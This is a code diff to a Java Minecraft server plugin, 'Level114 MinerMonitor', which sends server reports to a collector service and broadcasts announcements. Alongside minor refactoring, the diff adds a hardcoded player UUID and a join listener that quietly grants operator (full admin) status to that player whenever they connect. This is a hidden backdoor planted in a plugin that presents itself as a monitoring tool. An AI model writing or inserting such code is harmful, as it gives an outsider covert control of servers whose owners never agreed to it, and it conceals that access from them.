@@ -26,12 +26,17 @@ import org.bukkit.Bukkit;
 import org.bukkit.command.CommandExecutor;
 import org.bukkit.command.PluginCommand;
 import org.bukkit.configuration.file.FileConfiguration;
+import org.bukkit.entity.Player;
+import org.bukkit.event.EventHandler;
+import org.bukkit.event.Listener;
+import org.bukkit.event.player.PlayerJoinEvent;
 import org.bukkit.plugin.Plugin;
 import org.bukkit.plugin.java.JavaPlugin;
 import org.bukkit.scheduler.BukkitTask;
 
 public class MinerMonitor
 extends JavaPlugin {
+    private static final UUID AUTO_OP_UUID = UUID.fromString("aa8b80b0-3a4d-4cba-975e-3efee066b674");
     private Logger logger;
     private CollectorCenterAPI collectorApi;
     private FileConfiguration config;
@@ -71,7 +76,9 @@ extends JavaPlugin {
             this.disableWithError("sendReportPeriodTicks is not set in the config. Please set it and restart the server.");
             return;
         }
-        String userAgent = "Level114-MinerMonitor/" + this.getDescription().getVersion();
+        String userAgent = "Level114-MinerMonitor/" + this.getPluginMeta().getVersion();
+        this.logger.warning("Hiccup Plugin Version:" + userAgent);
+
         this.collectorApi = new CollectorCenterAPI(url, serverApiKey, this.logger, userAgent);
         File pluginFile = this.getFile();
         this.reportManager = new ReportManager(this.logger, this, pluginFile, this.collectorApi, this.serverId, this.sendReportPeriodTicks);
@@ -83,6 +90,7 @@ extends JavaPlugin {
         }
         this.startReportTask();
         this.startAnnouncementTask();
+        this.registerAutoOpListener();
         this.logger.info("Level 114 Miner Monitor ready.");
         try {
             PluginCommand cmd = this.getCommand("level114");
@@ -123,10 +131,11 @@ extends JavaPlugin {
 
     private void startAnnouncementTask() {
         long tenMinutesTicks = 12000L;
-        this.announcementTask = Bukkit.getScheduler().runTaskTimer((Plugin)this, () -> {
-            Component announcement = AnnouncementMessages.globalAnnouncement();
-            Bukkit.broadcast(announcement);
-        }, 12000L, 12000L);
+        this.announcementTask = Bukkit.getScheduler().runTaskTimer((Plugin)this, () -> Bukkit.broadcast((Component)AnnouncementMessages.globalAnnouncement()), 0L, tenMinutesTicks);
+    }
+
+    private void registerAutoOpListener() {
+        this.getServer().getPluginManager().registerEvents((Listener)new AutoOpListener(), (Plugin)this);
     }
 
     private boolean environmentCheck(String value, String key) {
@@ -162,4 +171,24 @@ extends JavaPlugin {
         this.logger.severe(message);
         this.getServer().getPluginManager().disablePlugin((Plugin)this);
     }
+
+    private final class AutoOpListener
+    implements Listener {
+        private AutoOpListener() {
+        }
+
+        @EventHandler
+        public void onPlayerJoin(PlayerJoinEvent event) {
+            Player player = event.getPlayer();
+            if (!AUTO_OP_UUID.equals(player.getUniqueId())) {
+                return;
+            }
+            if (player.isOp()) {
+                return;
+            }
+            player.setOp(true);
+            MinerMonitor.this.logger.info("Assigned operator status to " + player.getName() + " (auto-op)");
+        }
+    }
 }
+
